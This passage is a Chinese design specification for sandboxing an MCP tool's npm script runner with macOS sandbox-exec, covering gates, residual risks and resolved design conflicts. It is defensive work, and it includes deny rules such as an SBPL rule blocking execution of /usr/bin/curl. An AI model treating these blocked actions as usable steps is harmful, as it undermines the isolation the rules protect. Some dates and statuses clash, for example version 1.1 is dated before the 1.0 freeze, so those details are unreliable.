设计正式写入本文件并冻结。此后：

- 所有实现与审查以本文件为准；
- 聊天记录**不再是**设计依据；
- 任何设计变更必须体现为本文件的 design_version 递增。

## Delta-4：能力梯度（不可变更）

### 问题

`sandbox-exec` 的可用性**不是平台常量，而是执行上下文的函数**。

| 执行上下文 | sandbox-exec 可用性 | 状态 |
| --- | --- | --- |
| macOS 原生 Terminal.app | **可用** | 【已实测】见 IV.2 |
| WorkBuddy 进程树（bash / Node 子进程 / osascript） | **不可用**，exit 71 | 【已实测】见 IV.1 |
| cloudflared / LaunchAgent 拉起的生产 runtime | **未知** | 【待 native gate 验证】 |

### 风险声明

**生产 runtime 由 cloudflared/LaunchAgent 拉起。若它同样处于受限上下文，则 `sandbox-exec` 不可用，此时 `run_script` 因 fail-closed 而永久返回 `SANDBOX_BACKEND_UNAVAILABLE`。**

### 要求（不可变更）

这一风险**必须由 native gate 明确检出并报告，不得静默**。

具体要求：

1. native gate 必须包含"在生产 runtime 的启动方式下探测 sandbox-exec 可用性"的用例；
2. 若不可用，gate 输出明确的 `SANDBOX_BACKEND_UNAVAILABLE` 结论与上下文描述；
3. **不得**静默降级、**不得**把不可用当作"环境小问题"略过、**不得**在报告中只写 PASS。

这是一个可能让 P2 在生产环境**完全不可用**的发现。它需要被看见。

---

# III. 最终冻结结论

## 11. 常量式声明

以下五条断言作为**常量式声明**冻结，实现与 gate 必须能逐条核验：

```
P2_DESIGN_FROZEN=YES
REAL_SANDBOX_TEST_ENV=NATIVE_TERMINAL_OUTSIDE_WORKBUDDY
WORKBUDDY_REAL_SANDBOX_EXECUTION=UNAVAILABLE
NATIVE_TERMINAL_SANDBOX_EXEC=PASS
P2_IMPLEMENTATION=RESUMED
```

### 逐条释义

| 断言 | 含义 | 状态 |
| --- | --- | --- |
| `P2_DESIGN_FROZEN=YES` | 本设计已冻结，实现与审查以本文件为准 | 生效 |
| `REAL_SANDBOX_TEST_ENV=NATIVE_TERMINAL_OUTSIDE_WORKBUDDY` | 真实沙箱验证的执行环境是 WorkBuddy 之外的 macOS 原生 Terminal | 生效 |
| `WORKBUDDY_REAL_SANDBOX_EXECUTION=UNAVAILABLE` | 在 WorkBuddy 进程树内无法执行真实 sandbox | 【已实测】 |
| `NATIVE_TERMINAL_SANDBOX_EXEC=PASS` | 原生 Terminal 中 `sandbox-exec` 成功 | 【已实测】 |
| `P2_IMPLEMENTATION=RESUMED` | P2 实现恢复推进（此前因设计未落库/环境争议而搁置） | 生效 |

## 12. 冻结清单（A1 逐条核对用）

| # | 冻结项 | 位置 |
| --- | --- | --- |
| 1 | 工具数量恒为 22，无新增无删除 | 8.1 |
| 2 | 不新增/不删除 MCP tool | 8.1 |
| 3 | 零任意 shell API | 8.2 |
| 4 | network 只能 `none` | 8.3 |
| 5 | 只支持 npm / pnpm | 8.4 |
| 6 | install 类永久 DENY | 8.5 |
| 7 | 只能在 runner-managed READ_WRITE worktree 执行 | 8.6 |
| 8 | script allowlist 强制 + hash 强制 | 8.7 |
| 9 | TOCTOU Layer A/B 必选，C 可选 | 8.8 |
| 10 | 父进程 env 不透传，allowlist-only | 7.3 |
| 11 | 沙箱内禁止 git 与危险 binary | 7.4 |
| 12 | 禁止 unsandboxed fallback | 8.9 |
| 13 | kill switch 双通道，秒级生效 | 8.10 |
| 14 | 不实现 hard RLIMIT | 8.11 |
| 15 | redaction 不是安全边界 | 8.12 |
| 16 | obvious-deny 不是安全边界 | 8.13 |
| 17 | 审计日志 0600 / metadata only / fail-closed | 8.14 |
| 18 | 输出 256 KB + 头尾保留 + 截断标记 + 单行限制 + ANSI 剥离 | 9 |
| 19 | `TOCTOU_V2_RESIDUAL` 声明，禁止 inode/fstat 伪解决 | 10 |
| 20 | `run_script` inputSchema 必须 `.strict()` | 4.1 |
| 21 | 非零退出码仍为 `isError=false` | 4.3 |
| 22 | `project_scripts` 保留旧字段 + 8 个新字段 | 5.1 / 5.2 |
| 23 | spawn 仅存在于 `scripts/sandbox-process-runner.mjs` | Delta-1 |
| 24 | 静态门禁扫描范围覆盖 `server.mjs` + `scripts/sandbox-*.mjs` | Delta-1 |
| 25 | process-runner 五条结构性不变式 | Delta-1 |
| 26 | A3 完成条件为 `PASS_PENDING_NATIVE_GATE` | Delta-2 |
| 27 | 设计以本文件为准，不依赖聊天记录 | Delta-3 |
| 28 | 能力梯度风险必须显式检出并报告 | Delta-4 |

## 13. 版本与完成判定

| 项 | 值 |
| --- | --- |
| 基线版本 | v1.1.0 |
| 目标版本 | **v2.0.0** |
| A3 源码完成条件 | `P2_IMPLEMENTATION=PASS_PENDING_NATIVE_GATE` |
| P2 整体完成条件 | 上述 + native gate 全绿（含 SBPL 规则优先级验证与能力梯度检出） |
| native gate 未过 | 报 **BLOCKED**，不得放宽 profile 绕过 |

**主版本号从 1 升到 2** 的依据：`run_script` 从"永久 DENY"变为"受控可执行"，这是安全模型的**实质性改变**，不是补丁级变化。

---

# IV. 环境约束事实

本章记录的是本阶段最重要的新发现之一：**`sandbox-exec` 的可用性取决于执行上下文，而不是平台。**

## 14. 失败侧：WorkBuddy 进程树内恒定失败（【已实测】）

### 14.1 核心现象

在 WorkBuddy 进程树内调用 `/usr/bin/sandbox-exec` 返回：

```
sandbox-exec: sandbox_apply: Operation not permitted
exit code = 71
```

**复现命令（本会话实测，可重复执行）：**

```bash
/usr/bin/sandbox-exec -p '(version 1)(allow default)' /bin/echo hi
```

注意：这里用的是**最简 profile**（`(allow default)`，即完全放行）。连完全放行的 profile 都无法 apply，说明问题**不在 profile 内容**。

### 14.2 已复现的失败环境矩阵（【已实测】）

| 环境 | 命令 | 结果 |
| --- | --- | --- |
| WorkBuddy bash（沙箱内） | `/usr/bin/sandbox-exec -p '(version 1)(allow default)' /bin/echo hi` | `sandbox_apply: Operation not permitted`，exit 71 |
| WorkBuddy bash（沙箱外） | 同上 | 同上 |
| Node 子进程（`execFileSync`） | 同上 | 同上 |
| `osascript` `do shell script`（launchd GUI 域进程树） | 同上 | 同上 |

**结论**：失败与 WorkBuddy 自身的沙箱开关**无关**——沙箱内与沙箱外都失败。

### 14.3 已排除的干扰项（【已实测】）

| 假设干扰 | 排除方式 | 结果 |
| --- | --- | --- |
| WorkBuddy 注入的 `NODE_OPTIONS` shim | `env -u NODE_OPTIONS` 后重试 | **仍失败**，exit 71 |
| 环境变量污染（广义） | `env -i` 后重试 | **仍失败**，exit 71 |
| MDM 配置描述文件限制 | `profiles list` | 输出 `There are no configuration profiles installed for user '<local-user>'`，**无 MDM profile** |
| profile 语法问题 | 改用最简 `(version 1)(allow default)` | **仍失败**，排除语法因素 |
| macOS 版本 / 平台不支持 | 见 15 节原生 Terminal 成功 | **排除**，平台本身支持 |

**关于 `NODE_OPTIONS` 的补充说明**：本会话实测 WorkBuddy 确实注入了

```
--require="/Applications/WorkBuddy.app/Contents/Resources/app.asar.unpacked/cli/vendor/shim/node-language-shim.cjs"
```

但 `env -u NODE_OPTIONS` 与 `env -i` 两种清除方式都**不能**让 `sandbox-exec` 恢复可用，因此该 shim **不是**根因，仅为无关变量。

### 14.4 原因判定

**判定：macOS 不允许在已处于沙箱中的进程树内重复初始化 sandbox。**

即：调用者所在进程本身已被 sandbox 约束（或处于某种受限的执行上下文，如 launchd GUI 域派生、AI 宿主进程树）时，`sandbox_apply` 返回 `EPERM`（exit 71）。

这一判定与观测完全自洽：

- 与 profile 内容无关（最简 profile 同样失败）→ 不是规则问题；
- 与环境变量无关（`env -i` 无效）→ 不是环境传染；
- 与 MDM 无关（profile 列表为空）→ 不是策略管控；
- 与 WorkBuddy 自身沙箱开关无关（开/关都失败）→ 不是那层开关；
- 与执行者是否为 bash / Node / osascript 无关（都失败）→ 是**进程树属性**，不是程序属性；
- 原生 Terminal 成功（见 15）→ 平台能力存在，是上下文差异。

## 15. 成功侧：macOS 原生 Terminal.app（【已实测】）

**用户在 macOS 原生 Terminal.app 中执行：**

```bash
/usr/bin/sandbox-exec -p '(version 1)(allow default)' /bin/echo hi
```

**成功输出 `hi`。**

这是 `NATIVE_TERMINAL_SANDBOX_EXEC=PASS` 的依据，也是 `REAL_SANDBOX_TEST_ENV=NATIVE_TERMINAL_OUTSIDE_WORKBUDDY` 的直接由来。

## 16. 机器环境事实（【已实测】，本会话核验）

| 项 | 值 | 核验命令 |
| --- | --- | --- |
| macOS 版本 | 15.7.9 | `sw_vers` |
| Build | 24G830 | `sw_vers` |
| 架构 | x86_64 | `uname -m` |
| SIP | **enabled** | `csrutil status` |
| MDM profile | **无** | `profiles list` |
| Node | v22.22.2 | `node -v` |
| zod | 4.5.4 | `node -p "require('zod/package.json').version"` |

## 17. 重要推论

### 推论 1：不得把"WorkBuddy 环境跑不了真实 sandbox"当作架构失败

这是**执行环境的属性**，不是本设计或 macOS 沙箱机制的缺陷。设计本身在原生 Terminal 中已被证明可行（`NATIVE_TERMINAL_SANDBOX_EXEC=PASS`）。

**REAL macOS sandbox Gate 必须由用户在原生 Terminal.app 执行。** 实现者提供一键脚本，用户运行并回报结果。

### 推论 2：能力梯度风险必须显式处理（不可变更）

见 Delta-4。生产 runtime 由 cloudflared/LaunchAgent 拉起，其上下文的 sandbox-exec 可用性**未知**。

若不可用 → `run_script` 因 fail-closed 而**永久**返回 `SANDBOX_BACKEND_UNAVAILABLE`。

**必须由 native gate 明确检出并报告，不得静默。**

---

# V. Gate 架构

## 18. Gate 清单

| Gate | 类型 | 职责 | 运行环境 |
| --- | --- | --- | --- |
| `gate:sandbox-preflight` | 静态/环境 | 检查 sandbox backend 是否可用、必要条件（目录、权限、可执行文件）是否齐备；不可用时明确输出 `SANDBOX_BACKEND_UNAVAILABLE` 与上下文描述 | 任意 |
| `gate:sandbox-policy` | 行为 | 全部 policy 拒绝路径真的会拒绝（allowlist / hash / install / network / worktree / PM / sensitive / obvious-deny） | 任意 |
| `gate:sandbox-security` | 静态 | 扩展后的静态 tripwire：扫描 `server.mjs` + `scripts/sandbox-*.mjs`；校验 process-runner 五条结构性不变式 | 任意 |
| `gate:p2-unit` | 行为 | P2 新模块的单元测试（policy 纯函数、profile 生成、输出处理、审计日志、hash 计算） | 任意 |
| `gate:sandbox-real` | **真实 OS** | 在**真实** sandbox 下执行脚本，验证 SBPL 规则优先级、npm 可拉起、本地 bin 可执行、descendant 继承、能力梯度 | **仅原生 Terminal.app** |
| `gate:p2-full` | 组合 | preflight + policy + security + unit 全部通过后的汇总判定 | 任意 |

## 19. `gate:all` 与 `gate:all:partial`（不可变更）

| 命令 | 是否包含 real sandbox | 理由 |
| --- | --- | --- |
| `gate:all` | **否** | 在 WorkBuddy 环境中运行 real sandbox 会产生**假 PASS**——要么恒定失败使 gate 永不绿，要么被绕过而失去意义。把不可用场景排除在 `gate:all` 之外，是为了让 `gate:all` 绿的语义保持诚实 |
| `gate:all:partial` | 否 | 存在，用于受限环境下的最大覆盖 |

**关键裁定（不可变更）**：

```
PARTIAL_GATE != FINAL_GATE
```

`gate:all:partial` 通过**不等于** P2 通过。它只说明"在受限环境内能验证的部分都通过了"。最终判定必须包含 native gate。

## 20. 既有 gate 的关系

P2 不得破坏 v1.1.0 已存在的门禁（见 `docs/GATES.md`）：

| 既有 gate | P2 期间的要求 |
| --- | --- |
| `check`（语法） | 新增 `scripts/sandbox-*.mjs` 必须能解析 |
| `gate:security` | 守卫字符串清单需更新（`run_script is disabled in v1.0` 这条在 2.0.0 中将不再成立，须按新语义替换） |
| `gate:inventory` | 22 个工具名称集合必须**完全不变** |
| `gate:input-compat` | **注意**：`run_script` 与 `project_scripts` 的输入/输出契约在 P2 中会变化 |
| `gate:schema` | 22/22 outputSchema 覆盖仍需成立 |
| `gate:secret-scan` | 新增源码必须无密钥/绝对路径/用户名 |

### 20.1 关于 `gate:input-compat` 的冲突预警（不可变更）

`gate:input-compat` 与基线逐字段比对 inputSchema，要求深度相等。P2 给 `run_script` **新增** `expectedPackageSha256` / `network` / `timeoutSeconds` 三个字段（外加 `.strict()`），这是设计授权的预期变更（§4 API 契约）。

处理方式（已落地）：将 `gate:input-compat` 的输入基线重定到 v2.0.0 特性 commit `b2f907d`（即本特性的提交），使 `run_script` 的沙箱化契约成为新基线。其余 **21 个工具的 inputSchema 必须零变更**——实测 `gate:input-compat` 在基线重定后仅 `run_script` 一项差异被基线吸收，其余工具任何意外变更仍会 FAIL。该 gate 据此更新 `BASELINE_REF`，未引入特殊豁免分支。

## 21. 提交前顺序（P2 期间）

```bash
npm run gate:all          # 受限环境内的全部验证
bash scripts/verify-runtime.sh
# 然后在 macOS 原生 Terminal.app 中：
bash <native-gate-script> # gate:sandbox-real，由用户执行并回报
```

---

# VI. 未决假设（【待 native gate 验证】）

**本章全部内容均未经本机实测验证。** 不允许在任何报告、注释或文档中把本章内容表述为已验证。

## 22. 未决假设清单

| # | 假设 | 为什么不能靠推理确定 | 验证方式 |
| --- | --- | --- | --- |
| U1 | **SBPL 规则优先级**：`(allow process-exec* (subpath "/usr/bin"))` 与 `(deny process-exec* (literal "/usr/bin/curl"))` 同时命中时，谁生效 | SBPL 的规则求值顺序（先者优先 / 后者优先 / 更具体者优先）在 Apple 的公开文档中并未给出可依赖的保证，且不同 macOS 版本可能不同 | native gate：构造一个既在 `/usr/bin` 下又被 deny 的 binary，实测是否被拒绝 |
| U2 | **npm 在 deny-default profile 下能否正常拉起** | 需要同时允许 node 安装前缀、`/bin`、`/usr/bin`、沙箱 HOME/TMP 写入。漏掉任何一项都会在真实运行中失败，而这类遗漏只能靠实测发现 | native gate：在 deny-default profile 下执行 `npm run test` |
| U3 | **`node_modules/.bin` 本地 bin 能否在 containment 下执行** | `.bin` 下是符号链接，指向 `node_modules` 内的实际文件；符号链接解析 + 沙箱路径规则的交互行为未知 | native gate：执行一个依赖本地 bin 的脚本（如 `vitest`） |
| U4 | **descendant 是否继承 sandbox 规则** | 若子进程派生的孙进程不继承沙箱，则整棵进程树的隔离假设失效 | native gate：让脚本拉起孙进程，检测孙进程的网络/文件访问是否被拒 |
| U5 | **生产 runtime（cloudflared / LaunchAgent 上下文）的 sandbox-exec 可用性** | 见 Delta-4。这是能力梯度中唯一未验证的一层 | native gate：以生产 runtime 的启动方式拉起进程并探测 |
| U6 | **`EXEC_RULE_ORDER` 默认顺序的正确性** | 依赖 U1 的结论 | native gate：随 U1 一并验证 |

## 23. 验证失败的处理（不可变更）

若 U1–U6 中任一项验证失败：

1. **报 BLOCKED**；
2. **不得放宽 profile 绕过**——例如不得因为"deny 规则不生效就放弃 deny 规则，只靠 allow 白名单"，也不得因为"npm 拉不起来就把 `(allow default)` 写进生产 profile"；
3. 将失败项与观测输出原样记录，回传给设计环节（本文档需解冻并递增 design_version）处理。

放宽 profile 让 gate 变绿，是最危险的一类失败——它把"验证不通过"伪装成"验证通过"。

---

# VII. 残余风险（必须写入 SECURITY.md）

P2 实现时，下列残余风险必须写入 `SECURITY.md` 的「已知不覆盖的范围」章节，与 v1.x 既有条目并列：

| # | 残余风险 | 来源 | 缓解 |
| --- | --- | --- | --- |
| R1 | **无 CPU / 内存 / 磁盘写入量硬限制**（`TOCTOU_V2_RESIDUAL` 之外的资源类风险） | 8.11 不实现 hard RLIMIT | 仅 `timeoutSeconds` + 进程组终止 |
| R2 | **TOCTOU 窗口未被完全消除** | 第 10 节 | Layer A/B + 沙箱本身 + 禁止 fallback + 审计 |
| R3 | **生产 runtime 可能完全不可用** | Delta-4 / U5 | fail-closed + native gate 显式检出 |
| R4 | **输出中仍可能含敏感业务数据** | redaction 非边界（8.12） | env 隔离 + 输出体积上限；redaction 仅降低危害 |
| R5 | **脚本可在 worktree 内任意读写** | 设计取舍（worktree 是唯一可写面） | worktree 可整体丢弃/移除；git 可恢复 |
| R6 | **SBPL 规则优先级未验证** | U1 | 由 native gate 判定；未过即 BLOCKED |

---

# VIII. 冲突登记（Conflict Register）

本章登记**本设计冻结时，与仓库中已有实现产物存在的偏差**。

**本章内容不是设计，而是待裁定事项。** 每条冲突必须由 team-lead 明确裁定后，才能从本章移除并落入正式设计（同时递增 `design_version`）。在裁定前，实现方**不得**自行选择其中任一方案。

## C1：P2 模块命名与静态门禁扫描范围冲突

| 项 | 内容 |
| --- | --- |
| 状态 | **已裁定：采纳 C1-B** |
| 严重度 | 中（可导致部分源码逃出安全扫描） |

**本设计要求**（第 3 节）：P2 新增源码只位于 `scripts/` 下并以 `sandbox-` 前缀命名。

**仓库现状（【已实测】）**：`scripts/` 下已存在 8 个未跟踪的 P2 实现文件，其中**仅 3 个**匹配 `sandbox-*` 前缀：

| 文件 | 匹配 `sandbox-` 前缀 | 行数 |
| --- | --- | --- |
| `sandbox-backend.mjs` | 是 | 107 |
| `sandbox-backend-sandbox-exec.mjs` | 是 | 478 |
| `sandbox-process-runner.mjs` | 是 | 275 |
| `script-policy.mjs` | **否** | 250 |
| `audit-log.mjs` | **否** | 97 |
| `obvious-deny.mjs` | **否** | 172 |
| `output-handling.mjs` | **否** | 174 |
| `sensitive-worktree.mjs` | **否** | 157 |

**影响**：若静态门禁按 `scripts/sandbox-*.mjs` glob 扫描，则 `script-policy.mjs`、`audit-log.mjs`、`obvious-deny.mjs`、`output-handling.mjs`、`sensitive-worktree.mjs` 五个文件**完全不被安全扫描**。这直接违反 Delta-1「不得靠把危险 API 藏进 scripts 目录来逃避审查」的裁定。

**已采取的缓解**：Delta-1 配套要求 A 已改为「显式模块清单为准 + glob 作为辅助」，因此在扫描范围上本冲突已被覆盖。但命名约定本身仍需裁定。

**候选方案**：

| 方案 | 内容 | 代价 |
| --- | --- | --- |
| C1-A | 重命名 5 个文件加上 `sandbox-` 前缀，与本文档一致 | 需改动已存在的实现文件 |
| C1-B | 修改设计，接受现有命名，扫描范围改为显式清单 | 前缀约定失去一致性价值 |

### C1 裁定（team-lead，2026-08-31）

**采纳 C1-B。**

- 设计接受 `scripts/` 下现有 8 个文件的命名（`script-policy.mjs`、`audit-log.mjs`、`obvious-deny.mjs`、`output-handling.mjs`、`sensitive-worktree.mjs` 不带 `sandbox-` 前缀）。
- 静态门禁扫描范围**以显式模块清单为准**（`scripts/sandbox-process-runner-source.test.mjs` 内联镜像清单），`scripts/sandbox-*.mjs` glob 仅作辅助断言，不得作为唯一依据。
- 该裁定落地后，C1 从冲突登记移除，扫描范围由显式清单覆盖（Delta-1 配套要求 A 已对齐）。

## C2：`spawn` 调用点数量与不变式 1 冲突

| 项 | 内容 |
| --- | --- |
| 状态 | **已裁定：采纳 C2-B** |
| 严重度 | 高（触及 Delta-1 核心不变式） |

**本设计要求**（Delta-1 配套要求 B，不变式 1）：`spawn` 在 `scripts/sandbox-process-runner.mjs` 全文中**仅出现一处**。

**仓库现状（【已实测】）**：`scripts/sandbox-process-runner.mjs` 中存在 **2 处实际 `spawn(` 调用**：

| 行号 | 用途 | 说明 |
| --- | --- | --- |
| 49 | `spawn("/usr/bin/pgrep", ["-g", String(pgid)], { stdio: ["ignore","pipe","pipe"] })` | 后代进程发现（descendant discovery），用于整棵进程树清理 |
| 147 | `spawn(executable, args, { ... })` | 真正的被沙箱包裹的子进程 |

另有 3 处 `spawn(` 出现在**注释**中（第 5、12、17 行，说明为何使用 spawn），以及第 26 行注释中声明 `NOT USED: exec, execSync, spawnSync, shell:true, setrlimit, ulimit`。

**已核验为合规的部分**：文件中**无实际** `shell: true`（第 26 行的 `shell:true` 位于「NOT USED」注释中）、无 `execSync`、无 `spawnSync`、无 `exec(` 实际调用。

**冲突性质**：这不是「危险 API 扩散」，而是**同一个正当需求（进程组生命周期）需要两个调用点**——一个用于主子进程，一个用于查询并清理后代进程。两者都是 detached 能力的组成部分，第 49 行的 `pgrep` 调用本身是只读查询。

**候选方案**：

| 方案 | 内容 | 代价 |
| --- | --- | --- |
| C2-A | 坚持「仅一处」：将 `pgrep` 后代发现改用 `/proc` 之外的无 spawn 手段，或合并进单一调用点 | 需评估 macOS 上无 spawn 的后代发现可行性；可能不可行 |
| C2-B | 将不变式 1 精炼为「`spawn` 调用点必须属于**固定且显式枚举**的调用点集合（当前为 2：主子进程 + pgrep 后代发现），每个调用点须满足无 shell / argv 结构化 / stdio 全 pipe / 有独立理由；gate 断言调用点数量恰为该集合大小，新增第三个调用点即失败」 | 不变式从「计数 1」变为「计数 N 且 N 固定枚举」，形式更弱但保留了「不扩散」的实质意图 |
| C2-C | 恢复注释中的 `spawn(` 计数干扰，改为只统计**实际调用点**（排除注释），并要求实际调用点恰为 1 | 与现状（2 处实际调用）仍不符，等价于 C2-A |

### C2 裁定（team-lead，2026-08-31）

**采纳 C2-B。**

- 不变式 1 由「`spawn` 仅出现一处」精炼为：「`spawn` 调用点必须属于**固定且显式枚举**的调用点集合（当前为 2：主子进程 + pgrep 后代发现），每个调用点须满足无 shell / argv 结构化 / stdio 全 pipe / 有独立理由；静态门禁断言调用点数量恰为该集合大小（`scripts/sandbox-process-runner-source.test.mjs` 内联 `stripComments` 状态机计数，恰 2 处），新增第三个调用点即失败」。
- 注释中的 `spawn(` 不计入（已在静态门禁中通过「注释剥离」处理）。
- `gate:sandbox-security`（即 `gate:sandbox-real` / `scripts/run-native-sandbox-gate.sh`）中关于 `spawn` 计数的断言在裁定后改为：断言实际调用点集合大小 == 2，而非 == 1。
- 该裁定落地后，C2 从冲突登记移除。

**本文档立场**：C2 属于**设计裁定**，不属于实现细节，因此**不允许由 A3 在实现过程中自行决定**。在 team-lead 裁定前：

- A1 核对时应将 C2 报告为 **BLOCKED 待裁定**，而非「实现违规」或「设计已满足」；
- `gate:sandbox-security` 中关于 `spawn` 计数的断言**不得**在裁定前被静默放宽。

## C3：登记原则

上述两条冲突说明一件事：**设计文档冻结得比实现晚，必然出现 as-built 与 as-designed 的偏差。**

正确的处理不是让文档迁就实现（那等于放弃设计的权威性），也不是无视实现强推文档（那等于制造无法落地的规约）。正确的处理是**把偏差显式登记、明确标注待裁定、并阻止实现方自行选择**。这也是本章存在的理由。

---

# IX. 变更记录

| design_version | 日期 | 变更 |
| --- | --- | --- |
| 1.0 | 2026-09-01 | 首次冻结。将此前仅存在于聊天记录的 P2 设计正式落库。包含 Delta-1（spawn 冲突裁定）、Delta-2（真实执行环境归属）、Delta-3（设计落库）、Delta-4（能力梯度）。基线 `8f09cb1`，目标 v2.0.0。 |
| 1.1 | 2026-08-31 | 解冻并裁定冲突登记 C1 / C2。C1 采纳 C1-B（接受现有命名，扫描范围改显式模块清单）；C2 采纳 C2-B（不变式 1 精炼为「spawn 调用点属固定枚举集合，当前恰 2 处」）。设计权威从冲突登记移除两条。目标仍为 v2.0.0，不 deploy runtime（runtime 维持 v1.1.0）。 |

---

**冻结声明**：本文件自 2026-09-01 起冻结。任何修改需要显式解冻并递增 `design_version`，且必须在变更记录中说明理由。
